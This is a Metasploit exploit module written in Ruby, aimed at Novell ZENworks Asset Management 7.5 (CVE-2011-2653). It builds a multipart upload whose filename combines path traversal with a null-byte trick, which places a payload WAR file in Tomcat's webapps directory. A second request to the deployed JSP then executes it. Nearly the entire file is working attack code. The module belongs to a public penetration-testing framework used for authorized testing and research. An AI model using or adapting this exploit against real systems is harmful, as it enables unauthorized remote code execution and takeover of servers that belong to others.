##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Novell ZENworks Asset Management Remote Execution',
			'Description' => %q{
					This module exploits a path traversal flaw in Novell ZENworks Asset Management
				7.5. By exploiting the CatchFileServlet, an attacker can upload a malicious file
				outside of the MalibuUploadDirectory and then make a secondary request that allows
				for arbitrary code execution.
			},
			'Author'         =>
				[
					'Unknown', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2011-2653' ],
					[ 'OSVDB', '77583' ],
					[ 'BID', '50966' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-342/' ],
					[ 'URL', 'http://download.novell.com/Download?buildid=hPvHtXeNmCU~' ]
				],
			'Privileged'  => true,
			'Platform'    => [ 'java' ],
			'Targets'     =>
				[
					[ 'Java Universal',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java'
						},
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 02 2011'))

		register_options(
			[
				Opt::RPORT(8080),
				OptInt.new('DEPTH', [true, 'Traversal depth to reach the Tomcat webapps dir', 3])
			], self.class )
	end

	def exploit

		# Generate the WAR containing the payload
		app_base = rand_text_alphanumeric(4+rand(32-4))
		jsp_name = rand_text_alphanumeric(8+rand(8))
		war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s

		uid  = rand_text_alphanumeric(34).to_s

		data =  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"RequestParms\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"language\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"rtyp\"\r\n\r\n"
		data << "prod\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"sess\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"mode\"\r\n\r\n"
		data << "newreport\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"dp\"\r\n\r\n"
		data << "n\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"console\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"oldentry\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"act\"\r\n\r\n"
		data << "malibu.StartImportPAC\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"saveact\"\r\n\r\n"
		data << "malibu.StartImportPAC\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"isalert\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"language\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"queryid\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"Locale\"\r\n\r\n"
		data << "MM/dd/yyyy\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"CurrencySym\"\r\n\r\n"
		data << "$\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"CurrencyPos\"\r\n\r\n"
		data << "start\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"ThousandsSep\"\r\n\r\n"
		data << ",\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"CurDecimalPt\"\r\n\r\n"
		data << ".\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"MinusSign\"\r\n\r\n"
		data << "-\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"sum\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"grp\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"col\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"PreLoadRight\"\r\n\r\n"
		data << "yes\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"console\"\r\n\r\n"
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"uploadFile\"; filename=\"/#{"../" * datastore['DEPTH']}#{app_base}.war\x00.txt\"\r\n"
		data << "Content-Type: application/octet-stream\r\n\r\n"
		data << war_data
		data << "\r\n"
		data <<  "------#{uid}\r\n"
		data << "Content-Disposition: form-data; name=\"SuccessPage\"\r\n\r\n"
		data << "Html/UploadSuccess.html\r\n"
		data <<  "------#{uid}--\r\n"

		res = send_request_cgi(
			{
				'uri'    => "/rtrlet/catch",
				'method' => 'POST',
				'ctype'   => "multipart/form-data; boundary=----#{uid}",
				'data'    => data,
			})

		print_status("Uploading #{war_data.length} bytes as #{app_base}.war ...")

		select(nil, nil, nil, 10)

		if (res.code == 500)
			print_status("Triggering payload at '/#{app_base}/#{jsp_name}.jsp' ...")
				send_request_raw(
					{
						'uri'    => "/#{app_base}/" + "#{jsp_name}" + '.jsp',
						'method' => 'GET',
					})
		else
			print_error("WAR upload failed...")
		end

	end

end

